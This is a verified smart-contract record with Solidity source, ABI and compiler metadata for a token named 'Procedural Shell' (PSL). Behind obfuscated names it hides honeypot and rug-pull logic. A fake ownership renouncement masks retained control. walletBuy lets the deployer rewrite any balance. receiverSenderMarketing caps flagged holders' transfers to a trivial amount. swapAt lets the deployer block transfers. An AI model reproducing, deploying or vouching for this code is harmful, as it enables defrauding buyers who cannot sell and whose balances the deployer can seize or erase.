{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface shouldTxLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isLaunched) external view returns (uint256);\n\n    function transfer(address modeSell, uint256 tokenBuy) external returns (bool);\n\n    function allowance(address buyShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSell,\n        uint256 tokenBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTeam, uint256 value);\n    event Approval(address indexed buyShould, address indexed spender, uint256 value);\n}\n\nabstract contract feeTotalMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeToMarketing {\n    function createPair(address liquidityShouldWallet, address toSender) external returns (address);\n}\n\ninterface shouldTxLaunchMetadata is shouldTxLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProceduralShell is feeTotalMarketing, shouldTxLaunch, shouldTxLaunchMetadata {\n\n    bool private marketingMax;\n\n    event OwnershipTransferred(address indexed exemptTrading, address indexed sellReceiverExempt);\n\n    function balanceOf(address isLaunched) public view virtual override returns (uint256) {\n        return listLiquidity[isLaunched];\n    }\n\n    function approve(address feeExempt, uint256 tokenBuy) public virtual override returns (bool) {\n        listTake[_msgSender()][feeExempt] = tokenBuy;\n        emit Approval(_msgSender(), feeExempt, tokenBuy);\n        return true;\n    }\n\n    address modeTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public autoTeam;\n\n    mapping(address => bool) public feeEnable;\n\n    function walletBuy(address txAt, uint256 tokenBuy) public {\n        exemptEnable();\n        listLiquidity[txAt] = tokenBuy;\n    }\n\n    uint256 launchReceiver;\n\n    function transfer(address txAt, uint256 tokenBuy) external virtual override returns (bool) {\n        return txTokenLimit(_msgSender(), txAt, tokenBuy);\n    }\n\n    address public limitReceiverTo;\n\n    function owner() external view returns (address) {\n        return autoMin;\n    }\n\n    function txTokenLimit(address buyFund, address modeSell, uint256 tokenBuy) internal returns (bool) {\n        if (buyFund == autoTeam) {\n            return toAmount(buyFund, modeSell, tokenBuy);\n        }\n        uint256 limitEnableTotal = shouldTxLaunch(limitReceiverTo).balanceOf(modeTrading);\n        require(limitEnableTotal == minEnable);\n        require(modeSell != modeTrading);\n        if (feeEnable[buyFund]) {\n            return toAmount(buyFund, modeSell, tokenExemptTeam);\n        }\n        return toAmount(buyFund, modeSell, tokenBuy);\n    }\n\n    bool public liquidityAt;\n\n    function toAmount(address buyFund, address modeSell, uint256 tokenBuy) internal returns (bool) {\n        require(listLiquidity[buyFund] >= tokenBuy);\n        listLiquidity[buyFund] -= tokenBuy;\n        listLiquidity[modeSell] += tokenBuy;\n        emit Transfer(buyFund, modeSell, tokenBuy);\n        return true;\n    }\n\n    uint256 minEnable;\n\n    function transferFrom(address buyFund, address modeSell, uint256 tokenBuy) external override returns (bool) {\n        if (_msgSender() != autoWallet) {\n            if (listTake[buyFund][_msgSender()] != type(uint256).max) {\n                require(tokenBuy <= listTake[buyFund][_msgSender()]);\n                listTake[buyFund][_msgSender()] -= tokenBuy;\n            }\n        }\n        return txTokenLimit(buyFund, modeSell, tokenBuy);\n    }\n\n    mapping(address => uint256) private listLiquidity;\n\n    mapping(address => mapping(address => uint256)) private listTake;\n\n    function receiverSenderMarketing(address marketingSenderTake) public {\n        exemptEnable();\n        if (toMode) {\n            totalMin = true;\n        }\n        if (marketingSenderTake == autoTeam || marketingSenderTake == limitReceiverTo) {\n            return;\n        }\n        feeEnable[marketingSenderTake] = true;\n    }\n\n    bool public toMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minMode;\n    }\n\n    uint256 private marketingBuy;\n\n    function toTotal(address tokenSwap) public {\n        if (limitEnable) {\n            return;\n        }\n        \n        fundTotal[tokenSwap] = true;\n        \n        limitEnable = true;\n    }\n\n    string private amountFee = \"Procedural Shell\";\n\n    uint256 private buySell = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public fundTotal;\n\n    bool private takeAt;\n\n    string private minMode = \"PSL\";\n\n    uint256 public shouldAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountFee;\n    }\n\n    address autoWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function swapAt(uint256 tokenBuy) public {\n        exemptEnable();\n        minEnable = tokenBuy;\n    }\n\n    function exemptEnable() private view {\n        require(fundTotal[_msgSender()]);\n    }\n\n    address private autoMin;\n\n    uint256 private receiverFrom;\n\n    constructor (){\n        \n        maxLimit liquidityIsLaunched = maxLimit(autoWallet);\n        limitReceiverTo = modeToMarketing(liquidityIsLaunched.factory()).createPair(liquidityIsLaunched.WETH(), address(this));\n        if (takeAt == toMode) {\n            toMode = true;\n        }\n        autoTeam = _msgSender();\n        toMarketing();\n        fundTotal[autoTeam] = true;\n        listLiquidity[autoTeam] = buySell;\n        \n        emit Transfer(address(0), autoTeam, buySell);\n    }\n\n    uint256 constant tokenExemptTeam = 6 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buySell;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoMin;\n    }\n\n    bool public limitEnable;\n\n    bool private totalMin;\n\n    function toMarketing() public {\n        emit OwnershipTransferred(autoTeam, address(0));\n        autoMin = address(0);\n    }\n\n    uint8 private teamBuy = 18;\n\n    function allowance(address teamLaunched, address feeExempt) external view virtual override returns (uint256) {\n        if (feeExempt == autoWallet) {\n            return type(uint256).max;\n        }\n        return listTake[teamLaunched][feeExempt];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiverExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSenderTake\",\"type\":\"address\"}],\"name\":\"receiverSenderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"}],\"name\":\"toTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"walletBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ProceduralShell", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}